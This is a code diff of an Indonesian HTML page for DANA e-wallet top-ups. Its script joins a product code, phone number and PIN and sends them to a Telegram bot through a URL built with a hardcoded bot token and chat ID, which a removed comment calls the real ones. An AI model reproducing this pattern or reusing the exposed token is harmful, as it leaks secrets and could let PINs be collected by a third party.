@@ -25,7 +25,6 @@
             
             <div class="instruksi">Pilih Nominal Top-Up:</div>
             <select id="kode_produk" required>
-                <!-- Daftar Kode Sesuai H2H Qiospay -->
                 <option value="DN1">DANA 1.000 (DN1)</option>
                 <option value="DN2">DANA 2.000 (DN2)</option>
                 <option value="DN3">DANA 3.000 (DN3)</option>
@@ -76,10 +75,8 @@
 
             let formatPesan = kode + "." + nomor + "." + pin;
 
-            // Token dan Chat ID asli
             let tokenBot = "8669740968:AAHp-f7iMVSSCyvuvbDbqlF0lJkOt71d7-E";
             let chatId = "7933777456";
-            
             let urlTelegram = "https://api.telegram.org/bot" + tokenBot + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(formatPesan);
 
             let tombolSubmit = document.querySelector("button[type='submit']");
@@ -118,4 +115,4 @@
         });
     </script>
 </body>
-</html> 
+</html>
